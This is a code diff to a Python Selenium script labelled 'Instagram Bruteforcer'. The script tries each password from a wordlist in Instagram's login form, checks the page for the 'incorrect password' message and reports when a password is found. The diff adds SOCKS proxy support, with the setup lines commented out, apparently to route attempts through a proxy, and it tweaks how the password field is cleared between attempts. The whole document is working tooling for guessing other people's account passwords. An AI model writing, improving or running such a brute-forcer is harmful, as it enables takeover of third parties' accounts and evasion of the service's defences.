@@ -7,6 +7,12 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from bs4 import BeautifulSoup
 import time
+import socks
+import socket
+
+# Set up a SOCKS proxy
+# socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 1080)
+# socket.socket = socks.socksocket
 
 banner = pyfiglet.figlet_format("Instagram Bruteforcer")
 print(banner)
@@ -68,7 +74,7 @@ def startBruteforce(driver):
                     for line in file:
                      passwordField.send_keys(line)
                      print(f"Trying Password {line}")
-                     print("Before clearing:", passwordField.get_attribute("value"))
+                    #  print("Before clearing:", passwordField.get_attribute("value"))
                      time.sleep(1)
                      passwordField.click()
                      passwordField.clear()
@@ -77,8 +83,7 @@ def startBruteforce(driver):
                      time.sleep(3)
                      if "Sorry, your password was incorrect" in loginpage_source:
                         passwordField.clear()
-                        driver.execute_script("arguments[0].focus();", passwordField)
-                        driver.execute_script("arguments[0].value = '';", passwordField)
+                        
                         print("Invalid Password")
                     else:
                         print(f"Password Found {line} ") 
